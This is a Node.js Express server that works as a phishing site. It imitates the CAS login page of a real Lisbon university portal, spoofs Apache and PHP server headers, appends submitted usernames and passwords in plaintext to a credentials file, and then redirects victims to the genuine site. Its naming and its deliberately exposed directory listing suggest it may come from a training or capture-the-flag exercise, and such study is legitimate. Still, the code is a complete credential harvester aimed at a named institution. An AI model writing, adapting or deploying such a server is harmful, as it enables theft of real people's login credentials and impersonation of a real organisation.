const express = require("express");
const fs = require("fs");
const path = require("path");
const serveIndex = require("serve-index");

const app = express();
const PORT = Number(process.env.PHISHING_PORT || process.env.PORT || 8080);
const PUBLIC_DIR = path.join(__dirname, "public");

// Mimic production headers
app.disable("x-powered-by");
app.use((req, res, next) => {
  res.set("Server", "Apache/2.4.41 (Ubuntu)");
  res.set("X-Powered-By", "PHP/7.4.3");
  next();
});

// Middleware to parse form data
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// login get
app.get("/cas/login", (req, res) => {
  res.sendFile(path.join(PUBLIC_DIR, "index.html"));
});

// Handle login POST
app.post("/cas/login", (req, res) => {
  const { username, password } = req.body;
  const timestamp = new Date().toISOString();
  const line = `[${timestamp}] Username: ${username}, Password: ${password}\n`;

  // Save to credentials.txt
  const filePath = path.join(__dirname, "credentials.txt");
  fs.appendFile(filePath, line, (error) => {
    if (error) {
      console.error("Error writing credentials:", error);
    }
  });
  res.redirect("https://fenix.tecnico.ulisboa.pt/");
});

// Block direct access to private files
app.use((req, res, next) => {
  const requestPath = req.path.replace(/^\/+/, "/");
  if (/^\/credentials\.txt(\/|$)/.test(requestPath)) {
    return res.status(403).send("Forbidden");
  }
  if (/^\/var\/log\/credentials\.log(\/|$)/.test(requestPath)) {
    return res.status(403).send("Forbidden");
  }
  return next();
});

// Block access to node_modules/
app.use((req, res, next) => {
  let requestPath;
  try {
    requestPath = decodeURIComponent(req.path);
  } catch {
    return res.status(400).send("Bad request");
  }
  if (/^\/node_modules(?:\/|$)/i.test(requestPath)) {
    return res.status(403).send("Forbidden");
  }
  return next();
});

// Static content and certificate verification
app.use(express.static(PUBLIC_DIR, { index: false }));
app.use(express.static(__dirname, { dotfiles: "allow", index: false }));
app.use(serveIndex(__dirname, { icons: true, hidden: true }));

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
